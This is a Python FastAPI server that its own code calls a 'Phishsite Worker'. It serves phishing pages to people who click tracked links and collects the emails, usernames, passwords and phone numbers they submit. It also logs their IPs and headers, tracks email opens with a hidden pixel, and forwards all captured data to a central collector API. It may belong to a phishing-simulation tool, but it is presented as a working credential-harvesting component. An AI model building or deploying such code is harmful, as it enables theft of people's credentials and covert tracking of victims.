from fastapi import FastAPI, Form, Request, status
from fastapi.responses import (HTMLResponse,
                               PlainTextResponse,
                               Response,
                               RedirectResponse)
from datetime import datetime, timedelta
import uvicorn
import jwt
from httpx import AsyncClient
import json
import jinja2
import sys
from user_agents import parse
import os
app = FastAPI()

API = 'http://127.0.0.1:50502/workers'
SECRET = None
ID = None
environment = jinja2.Environment()

OPEN = 'open_email'
CLICK = 'click_link'
SUBMIT = 'submit_data'


def parse_user_agent(user_agent):
    user_agent_parsed = parse(user_agent)

    return {
        'browser': user_agent_parsed.browser.family + '/' + user_agent_parsed.browser.version_string,
        'operating_system': user_agent_parsed.os.family + ' ' + user_agent_parsed.os.version_string
    }


LOG_PATH = os.path.join(os.path.dirname(__file__), "logs")


def write_log(ref: str, request: Request):
    ref = ref.strip()
    file_path = os.path.join(LOG_PATH, f"{ref[:4]}.txt")
    with open(file_path, 'a') as f:
        f.write("------------------------------\n")
        f.write(datetime.now().isoformat()+"\n")
        f.write("ref :" + ref + "\n")
        f.write("path" + request.url.path + '\n')
        f.write("method :" + request.method.capitalize() + "\n")
        f.write(str(request.headers) + "\n")
        f.write(str(request.client) + "\n")
        f.write("------------------------------\n")


async def test(request: Request, ref):

    write_log(ref, request)

    head = request.headers

    user_agent = head.get("User-Agent")

    data = dict()
    if user_agent:
        data['ip'] = head.get("host")
        parsed_user_agent = parse_user_agent(user_agent)
        data['client'] = str(request.client.host)
        data.update(parsed_user_agent)

    print(data)
    return data


@app.get("/", response_class=HTMLResponse)
async def index(requset: Request, ref: str | None = None):
    if not ref:
        return HTMLResponse(status_code=404)
    agent = await test(requset, ref)
    body = await emit_event(CLICK, ref, agent)
    if body:
        try:
            return body['html']
        except Exception as e:
            print(e, body['html'])
    return HTMLResponse(status_code=404)


@app.post("/", response_class=RedirectResponse, status_code=303)
async def index(request: Request, ref: str | None = None, email: str = Form(None),
                username: str = Form(None), password: str = Form(None),
                phomenumber: str = Form(None), etc: str = Form(None)):
    if not ref:
        return RedirectResponse("/", status_code=303)
    data = dict()
    if email:
        data['email'] = email
    if username:
        data['username'] = username
    if password:
        data['password'] = password
    if phomenumber:
        data['phomenumber'] = phomenumber
    if etc:
        data['etc'] = etc
    agent = await test(request, ref)
    data.update(agent)

    body = await emit_event(event_type=SUBMIT, ref=ref, payload=data)
    if body:
        return RedirectResponse(body['redirect_url'], status_code=303)

    return RedirectResponse("/", status_code=303)


@app.get(
    "/image/dot.png",
    responses={
        200: {
            "content": {"image/png": {}}
        }
    },
    response_class=Response
)
async def get_image(ref: str | None = None):
    dot = b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90wS\xde\x00\x00\x00\x01sRGB\x00\xae\xce\x1c\xe9\x00\x00\x00\x04gAMA\x00\x00\xb1\x8f\x0b\xfca\x05\x00\x00\x00\tpHYs\x00\x00\x12t\x00\x00\x12t\x01\xdef\x1fx\x00\x00\x00\x0cIDAT\x18Wc\xf8\xff\xff?\x00\x05\xfe\x02\xfe\xa75\x81\x84\x00\x00\x00\x00IEND\xaeB`\x82'
    if not ref:
        return Response(status_code=404)
    body = await emit_event(event_type=OPEN, ref=ref)
    if body and body['success']:
        return Response(content=dot, media_type="image/png")
    return Response(status_code=404)


@app.get("/robots.txt", response_class=PlainTextResponse)
def robots():
    return 'User-agent: *\nDisallow: /'


@app.post('/ping', status_code=201)
async def ping(req: Request):
    try:
        body = await req.json()
        print(body)
        if validate_token(body['ref_key']):
            return {'ref_key': body['ref_key'],
                    'pong': body['ping']}
    except Exception as e:
        print(e)
    return Response(status_code=404)


def create_token():
    return jwt.encode({"id": ID,
                       "exp": datetime.utcnow() + timedelta(minutes=3)},
                      SECRET, algorithm="HS256")


def validate_token(ref_key: str):
    try:
        data = jwt.decode(ref_key, SECRET, algorithms=["HS256"])
        print(ID, data['id'])
        if data['id'] == ID:
            return True
    except Exception as e:
        print(e)
    return False


async def emit_event(event_type: str, ref, payload: str | None = None):
    async with AsyncClient() as client:
        try:
            token = create_token()
            res = await client.post(API, headers={'Authorization': f'Bearer {token}'}, json={'ref_key': ref[:4], 'ref_id': ref[4:],
                                                                                             'event_type': event_type, 'payload': payload})
            if res.status_code == 200:
                return res.json()
        except Exception as e:
            print(e)
    return

if __name__ == "__main__":
    if len(sys.argv) == 5:
        host = sys.argv[1]
        port = sys.argv[2]
        sect = sys.argv[3]
        idd = sys.argv[4]
    else:
        host = input('HOST IP (0.0.0.0): ')
        port = input('HOST PORT (8080): ')
        sect = input('SECRET ("helloworld"): ')
        idd = input("Worker ID (1): ")
    if not host:
        host = '0.0.0.0'
    if not port:
        port = 8080
    else:
        port = int(port)
    if sect:
        SECRET = sect
    else:
        SECRET = 'helloworld'
    if idd:
        ID = int(idd)
    else:
        ID = 1

    print(f"Phishsite Worker ID:{ID} SECRET:{SECRET[0]+'*'*(len(SECRET)-1)}")
    uvicorn.run(app, host=host, port=port)
